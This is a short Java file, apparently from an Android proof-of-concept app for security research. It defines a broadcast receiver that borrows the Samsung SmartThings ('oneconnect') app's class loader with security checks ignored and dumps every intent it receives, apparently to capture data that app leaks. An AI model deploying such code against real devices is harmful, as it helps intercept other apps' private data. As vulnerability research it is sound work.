package poc.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, getForeignClassLoader(context, "com.samsung.android.oneconnect"));
    }

    private static ClassLoader getForeignClassLoader(Context context, String str) {
        try {
            return context.createPackageContext(str, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY)
                    .getClassLoader();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}
